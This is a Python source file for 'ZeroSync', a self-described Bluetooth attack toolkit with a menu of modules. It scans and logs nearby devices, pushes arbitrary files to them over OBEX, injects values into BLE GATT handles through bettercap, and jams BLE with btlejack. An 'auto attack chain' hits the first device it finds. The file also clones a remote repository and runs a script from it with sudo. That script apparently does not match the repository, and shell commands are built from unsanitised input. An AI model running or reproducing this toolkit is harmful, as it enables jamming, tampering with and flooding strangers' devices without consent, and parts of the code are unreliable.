#!/usr/bin/env python3

import os
import sys
import time
import threading
import subprocess
from bluetooth import discover_devices, BluetoothSocket, BluetoothError
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt

console = Console()
scanned = []
scanning = False
scan_thread = None
log_file = "zerosync_scanlog.txt"

def scan_devices():
    global scanned, scanning
    scanning = True
    scanned.clear()
    console.print("[bold yellow]Scanning for Bluetooth devices... (Use Stop to cancel)[/bold yellow]")
    while scanning:
        try:
            nearby_devices = discover_devices(duration=8, lookup_names=True)
            for addr, name in nearby_devices:
                if addr not in [x[0] for x in scanned]:
                    scanned.append((addr, name))
                    console.print(f"[green][+] {addr} - {name}[/green]")
                    with open(log_file, "a") as log:
                        log.write(f"{addr} - {name}\n")
            time.sleep(3)
        except BluetoothError as e:
            console.print(f"[red]Bluetooth Error:[/red] {e}")
            break
        except Exception as ex:
            console.print(f"[red]Unknown Scan Error:[/red] {ex}")
            break

def start_scan_thread():
    global scan_thread, scanning
    if not scanning:
        scan_thread = threading.Thread(target=scan_devices, daemon=True)
        scan_thread.start()
    else:
        console.print("[yellow]Scan already in progress.[/yellow]")

def stop_scan():
    global scanning
    if scanning:
        scanning = False
        console.print("[bold red]Scanning stopped.[/bold red]")
    else:
        console.print("[cyan]No scan running.[/cyan]")

def show_scanned_devices():
    if not scanned:
        console.print("[bold red]No devices found.[/bold red]")
        return
    table = Table(title="Scanned Devices")
    table.add_column("Address", style="cyan")
    table.add_column("Name", style="magenta")
    for addr, name in scanned:
        table.add_row(addr, name)
    console.print(table)

def select_device():
    if not scanned:
        console.print("[red]No scanned devices to choose from.[/red]")
        return None
    show_scanned_devices()
    choice = Prompt.ask("[cyan]Enter the address of the device to target[/cyan]")
    for addr, name in scanned:
        if addr == choice:
            return addr
    console.print("[red]Device not found in scan list.[/red]")
    return None

def blueborne_scanner():
    console.print("[bold green]Launching BlueBorne scan...[/bold green]")
    os.system("git clone https://github.com/evilsocket/btlejack 2>/dev/null || true")
    os.system("cd btlejack && sudo python3 blueborne-detector.py")

def obex_file_bomb(target=None):
    if not target:
        target = select_device()
    if not target:
        return
    file_path = Prompt.ask("[bold cyan]Path to file to send[/bold cyan]")
    console.print("[yellow]Sending file via OBEX...[/yellow]")
    os.system(f"obexftp --nopath --noconn --uuid none --bluetooth {target} --channel 9 -p '{file_path}'")

def signal_strength_tracker(target=None):
    if not target:
        target = select_device()
    if not target:
        return
    console.print(f"[bold]Tracking signal strength for {target}...[/bold]")
    for _ in range(10):
        try:
            out = subprocess.check_output(["hcitool", "rssi", target]).decode()
            console.print(f"[green]{out.strip()}[/green]")
        except:
            console.print("[red]Failed to read RSSI[/red]")
        time.sleep(2)

def bettercap_ble_attack():
    cmd = Prompt.ask("[bold cyan]Enter Bettercap BLE command[/bold cyan]")
    os.system(f"echo '{cmd}' | sudo bettercap -eval")

def bettercap_bridge():
    console.print("[yellow]Launching Bettercap with BLE bridge...[/yellow]")
    os.system("sudo bettercap -iface hci0 -eval 'ble.recon on; ble.show'")

def bettercap_gatt_inject():
    target = select_device()
    if not target:
        return
    handle = Prompt.ask("[bold cyan]Enter handle to write to[/bold cyan]")
    value = Prompt.ask("[bold cyan]Enter value to inject[/bold cyan]")
    os.system(f"sudo bettercap -iface hci0 -eval 'ble.connect {target}; ble.write {handle} {value}'")

def launch_btlejack_jammer():
    console.print("[bold red]Launching BLE Jammer...[/bold red]")
    os.system("btlejack -j")

def auto_attack_chain():
    console.print("[bold red]Running automated attack chain...[/bold red]")
    start_scan_thread()
    time.sleep(5)
    stop_scan()
    show_scanned_devices()
    if scanned:
        target = scanned[0][0]
        console.print(f"[yellow]Auto-selecting target:[/yellow] {target}")
        signal_strength_tracker(target)
        obex_file_bomb(target)
        bettercap_gatt_inject()
    else:
        console.print("[red]No devices to attack.[/red]")

def banner():
    panel = Panel.fit(
        "[bold magenta]ZeroSync v4.7[/bold magenta]\n[green]Bluetooth Attack Toolkit[/green]\n[yellow]Created by Null_Lyfe[/yellow]",
        title="🧿 ZeroSync",
        border_style="bright_blue"
    )
    console.print(panel)

def main_menu():
    while True:
        banner()
        table = Table(title="Attack Modules")
        table.add_column("Option", style="bold green")
        table.add_column("Attack Module", style="bold yellow")
        table.add_row("1", "🔍 Scan Devices")
        table.add_row("2", "🛑 Stop Scanning")
        table.add_row("3", "📜 Show Devices")
        table.add_row("4", "🐞 BlueBorne Scan")
        table.add_row("5", "💣 OBEX File Bomb")
        table.add_row("6", "📶 Signal Strength Tracker")
        table.add_row("7", "🔗 Bettercap BLE Command")
        table.add_row("8", "🧠 Bettercap BLE Bridge")
        table.add_row("9", "⚙️ BLE GATT Injector")
        table.add_row("10", "🚫 BLE Jammer (btlejack)")
        table.add_row("11", "🚀 Auto Attack Chain")
        table.add_row("0", "❌ Exit")
        console.print(table)
        try:
            choice = Prompt.ask("[bold cyan]Select Option[/bold cyan]")
            if choice == "1":
                start_scan_thread()
            elif choice == "2":
                stop_scan()
            elif choice == "3":
                show_scanned_devices()
            elif choice == "4":
                blueborne_scanner()
            elif choice == "5":
                obex_file_bomb()
            elif choice == "6":
                signal_strength_tracker()
            elif choice == "7":
                bettercap_ble_attack()
            elif choice == "8":
                bettercap_bridge()
            elif choice == "9":
                bettercap_gatt_inject()
            elif choice == "10":
                launch_btlejack_jammer()
            elif choice == "11":
                auto_attack_chain()
            elif choice == "0":
                stop_scan()
                console.print("[bold red]Exiting ZeroSync...[/bold red]")
                break
            else:
                console.print("[red]Invalid choice[/red]")
        except KeyboardInterrupt:
            stop_scan()
            break

if __name__ == "__main__":
    main_menu()
